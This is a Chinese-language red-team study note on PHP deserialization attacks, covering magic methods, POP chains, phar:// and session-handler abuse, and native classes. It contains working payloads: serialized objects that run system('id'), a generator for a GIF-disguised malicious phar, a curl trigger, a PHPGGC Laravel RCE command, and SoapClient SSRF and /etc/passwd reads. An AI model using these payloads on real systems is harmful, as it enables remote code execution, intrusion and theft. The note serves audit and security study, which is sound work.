## 目录

- [[#一、序列化基础|一、序列化基础]]
- [[#二、魔术方法|二、魔术方法]]
- [[#三、反序列化漏洞原理|三、反序列化漏洞原理]]
- [[#四、POP链构造|四、POP链构造]]
- [[#五、phar反序列化|五、phar反序列化]]
- [[#六、session反序列化|六、session反序列化]]
- [[#七、原生类利用|七、原生类利用]]
- [[#八、红队视角总结|八、红队视角总结]]

---

## 一、序列化基础

### serialize / unserialize

```php
<?php
class User {
    public $name = "admin";
    public $is_admin = 0;
}

$u = new User();
echo serialize($u);
// O:4:"User":2:{s:4:"name";s:5:"admin";s:8:"is_admin";i:0;}

// 反序列化
$obj = unserialize('O:4:"User":2:{...}');
?>
```

### 序列化格式速查

| 类型 | 格式 | 示例 |
|------|------|------|
| 字符串 | `s:长度:"内容"` | `s:5:"admin"` |
| 整数 | `i:值` | `i:1` |
| 布尔 | `b:0/1` | `b:1` |
| NULL | `N` | `N` |
| 数组 | `a:个数:{键值对}` | `a:1:{s:3:"k";i:1;}` |
| 对象 | `O:类名长度:"类名":属性数:{...}` | `O:4:"User":2:{...}` |

```php
<?php
// 属性名带类名引用（私有属性）
// O:4:"User":2:{s:8:"\0User\0name";...}
?>
```

---

## 二、魔术方法

反序列化时 PHP 自动触发一系列"魔术方法"：

| 方法 | 触发时机 | 攻击价值 |
|------|---------|---------|
| `__wakeup()` | unserialize 时 | 属性初始化，常含危险操作 |
| `__destruct()` | 对象销毁时 | 常调用 `system/file_put_contents` |
| `__toString()` | 对象当字符串用时 | `echo $obj` 触发 |
| `__call()` | 调用不存在方法 | 转发到危险函数 |
| `__get()` / `__set()` | 访问不存在的属性 | 转发 |
| `__invoke()` | 对象当函数调用 | |
| `__sleep()` | serialize 时 | 反方向 |
| `__construct()` | **unserialize 不触发**（PHP 8 前） | 注意！ |

```php
<?php
class Evil {
    public $cmd;
    function __destruct() {
        system($this->cmd);   // 对象销毁时执行
    }
}
// unserialize 恶意数据 → 对象析构 → RCE
$payload = 'O:4:"Evil":1:{s:3:"cmd";s:2:"id";}';
unserialize($payload);
?>
```

> **核心**：`__wakeup` 与 `__destruct` 在反序列化流程中必然触发，是 POP 链的入口。

---

## 三、反序列化漏洞原理

### 漏洞代码

```php
<?php
// 危险：直接反序列化用户输入
$data = unserialize($_POST['data']);

// 常见场景：cookie/session 存对象
$user = unserialize(base64_decode($_COOKIE['user']));
?>
```

### 危害链条

```text
用户输入 → unserialize → 恶意对象被创建
  → __wakeup/__destruct/__toString 触发
  → 危险函数执行（system/eval/文件操作）
  → RCE / 文件读写 / SSRF
```

### 触发前提

| 条件 | 说明 |
|------|------|
| 入口 | `unserialize($_GET/$_POST/$_COOKIE/...)` |
| 类存在 | 目标代码中可用的类（含框架类） |
| 魔术方法 | 存在危险魔术方法 |
| 属性可控 | 属性值可被 payload 指定 |

---

## 四、POP链构造

POP（Property-Oriented Programming）：利用现有类的属性与魔术方法，串成一条"链"，从入口到危险函数。

### 示例：两条类链

```php
<?php
class A {
    public $b;
    function __wakeup() {
        echo $this->b;      // 触发 B::__toString
    }
}
class B {
    public $cmd;
    function __toString() {
        system($this->cmd); // RCE
    }
}
?>
```

```text
构造 payload:
O:1:"A":1:{s:1:"b";O:1:"B":1:{s:3:"cmd";s:2:"id";}}

触发流:
unserialize → A::__wakeup → echo $this->b
  → B 对象被当字符串 → B::__toString → system("id") → RCE
```

### 构造工具

| 工具 | 用途 |
|------|------|
| PHPGGC | 主流框架 gadget 集合：Laravel/ThinkPHP/Symfony 等一键生成 |
| 手写 | 审计目标源码，收集可用类与危险方法 |

```bash
# PHPGGC 示例（Laravel RCE）
php phpggc Laravel/RCE1 system 'id'
```

### 构造思路

1. 收集源码中所有类（grep `class `）
2. 找危险方法：`__destruct/__wakeup/__toString` 内调用 `system/eval/include/file_put_contents`
3. 从危险方法逆向：需要什么属性 → 谁赋值 → 谁能触发
4. 生成 payload，本地 `php -r` 验证

---

## 五、phar反序列化

### 原理

`phar://` 协议读取 phar 文件时，**元数据部分会自动反序列化**，无需 `unserialize` 入口！

```php
<?php
// 只需要一个 phar:// 可用点：
include("phar://uploads/shell.phar");
file_get_contents("phar://uploads/shell.phar/x");
// 读取 phar 元数据 → 自动 unserialize
?>
```

### 生成恶意 phar

```php
<?php
// gen.php
class Evil {
    public $cmd;
    function __destruct() { system($this->cmd); }
}
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('x', 'x');
$phar->setStub('GIF89a<?php __HALT_COMPILER();?>');  // 伪装图片头
$phar->setMetadata(new Evil());   // 元数据放恶意对象
$phar->stopBuffering();
?>
```

```bash
php -d phar.readonly=0 gen.php
# 生成 shell.phar（文件头为 GIF89a，可伪装图片上传）
```

### 利用点（触发 phar:// 的位置）

| 函数 | 场景 |
|------|------|
| `file_exists()` | 最常见的判断入口 |
| `file_get_contents()` | 读文件 |
| `include()` | 包含 |
| `fopen()` | 打开 |
| `is_file()` / `is_dir()` | 判断 |
| `unlink()` | 删除 |
| `getimagesize()` | 上传校验（图像处理） |
| `exif_read_data()` | EXIF 处理 |

```bash
# 利用：把 phar 文件伪装成图片上传，再触发文件操作
curl -s "http://target/index.php?f=phar://uploads/shell.phar"
```

> 老版本 PHP（< 8.0）`phar://` 是通用 RCE 路径。PHP 8.0+ 对 `phar://` 的元数据反序列化仍存在（限制更严），但仍是审计重点。

---

## 六、session反序列化

### 序列化处理器差异

| `session.serialize_handler` | 格式 | 特点 |
|----------------------------|------|------|
| `php`（默认） | `键|序列化值` | 竖线分隔 |
| `php_serialize` | 整体 serialize 数组 | 无竖线 |
| `php_binary` | 长度前缀 | |

### 利用：处理器不一致

```php
<?php
// 写入用 php_serialize，读取用 php（或反之）→ 竖线错位注入
// ini_set('session.serialize_handler', 'php_serialize');
// 但读取时恢复 php → session 文件内容被错误解析
?>
```

```text
攻击流程:
1. 目标写入 session 时用 php_serialize:
   $_SESSION['x'] = "|O:4:\"Evil\":1:{s:3:\"cmd\";s:2:\"id\";}"
   → 文件内容: a:1:{s:1:"x";s:40:"|O:4:"Evil":...";}
2. 读取时目标用 php 处理器:
   按 | 分隔 → 键 = a:1:{s:1:"x";s:40:"  值 = O:4:"Evil":... 
   → 值被 unserialize → 恶意对象实例化
```
### Session 文件内容注入

```text
session 文件路径: /var/lib/php/sessions/sess_<PHPSESSID>
可控值: 用户名/搜索词/任意 $_SESSION 写入
注入: 值内含序列化 payload → 配合处理器差异触发
```

> 红队遇到"登录框能写 session"+"目标用 php_serialize"时，可尝试此链。

---

## 七、原生类利用

无自定义类可用时，利用 PHP 内置类：

| 原生类 | 用途 |
|--------|------|
| `SoapClient` | SSRF + 自定义 Header（可打内网服务） |
| `SplFileObject` | 任意文件读/写（配合 filter 封装器） |
| `phar` 相关 | 触发反序列化 |
| `Error` / `Exception` | `__toString` 泄露内部信息 |
| `SimpleXMLElement` | XXE 读取文件 |
| `FFI`（7.4+） | 直接调用 C 库函数（条件苛刻） |

```php
<?php
// SoapClient SSRF 示例
$payload = serialize(new SoapClient(null, array(
    'location' => 'http://127.0.0.1:8080/admin',
    'uri'      => 'http://x'
)));
// 反序列化后调用方法 → 发起内网请求
?>
```

```php
<?php
// SplFileObject 读文件
$p = 'O:12:"SplFileObject":1:{s:0:"";s:11:"/etc/passwd";}';
// 触发 __toString 等场景可读文件
?>
```

---

## 八、红队视角总结

| 知识点 | 要点 |
|--------|------|
| 序列化格式 | `O:类:"属性"` `s:长度:"值"` 手写 payload 基础 |
| 魔术方法 | `__wakeup/__destruct/__toString` 是 POP 链入口 |
| 入口 | `unserialize(用户输入)` 直接利用 |
| phar | `phar://` 元数据自动反序列化，`file_exists` 等函数即入口 |
| session | 序列化处理器不一致 → 错位注入 |
| 工具 | PHPGGC 生成主流框架 gadget |
| 原生类 | SoapClient/SplFileObject 无类可用的兜底 |

**审计搜索**：`unserialize`、`__wakeup`、`__destruct`、`__toString`、`phar://`、`session.serialize_handler`。

**关联**：CTF 反序列化题型见 [[../../ctf_trea/Web/Web前置技能/程序语言/程序语言|CTF 程序语言前置]]。

---

**返回** [[PHP基础总目录|PHP 总目录]] | [[../前端基础总目录|前端基础总目录]]